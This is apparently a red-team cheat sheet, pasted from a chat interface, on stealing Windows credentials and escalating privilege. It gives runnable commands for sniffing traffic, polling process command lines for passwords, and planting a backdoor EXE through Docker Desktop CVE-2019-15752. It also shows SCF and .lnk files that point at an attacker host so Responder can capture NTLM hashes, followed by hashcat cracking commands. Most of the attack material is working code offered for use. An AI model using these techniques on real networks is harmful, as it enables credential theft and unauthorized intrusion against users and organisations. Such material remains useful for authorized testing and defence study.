ğŸ 1. Traffic Capture
If Wireshark is installed and npcap is unrestricted â†’ capture FTP, HTTP Basic, etc.

You can use:

powershell
Copy
Edit
Start-Process Wireshark
Or from attack box:

bash
Copy
Edit
sudo tcpdump -i eth0 -w capture.pcap
ğŸ“¦ Tool: net-creds â€” parses live or recorded captures for creds.

ğŸ‘€ 2. Monitor Process Command Lines
Users may unknowingly leak passwords in process command lines (common in backup scripts, net use commands, etc).

One-liner:

powershell
Copy
Edit
while($true){ $a=Get-WmiObject Win32_Process | Select CommandLine; Start-Sleep 2; $b=Get-WmiObject Win32_Process | Select CommandLine; Compare-Object -ReferenceObject $a -DifferenceObject $b }
Example find:

perl
Copy
Edit
net use T: \\sql02\backups /user:domain\sqlsvc My4dm1nP@s5w0Rd
ğŸ³ 3. Docker Desktop CVE-2019-15752
Path: C:\PROGRAMDATA\DockerDesktop\version-bin\

If BUILTIN\Users can write here, and file like docker-credential-wincred.exe is missing â†’ drop your malicious payload.

It executes when:

Docker restarts

docker login is triggered by a user

ğŸ› ï¸ Drop a backdoor EXE, wait for it to fire.

ğŸ“¦ 4. Malicious SCF File on Share
If a user browses a directory with a specially crafted .scf, their system initiates SMB auth â†’ Responder snags the hash.

ini
Copy
Edit
[Shell]
Command=2
IconFile=\\<attacker_ip>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
Run Responder:

bash
Copy
Edit
sudo responder -I tun0 -wrf
Then crack it:

bash
Copy
Edit
hashcat -m 5600 hash.txt rockyou.txt
ğŸ§² 5. Malicious .lnk Files
Server 2019 blocks SCF-based leaks, so switch to .lnk (shortcut files).

PowerShell to generate:

powershell
Copy
Edit
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.Save()
Drop that .lnk on a share, wait for user to hover/click/open.

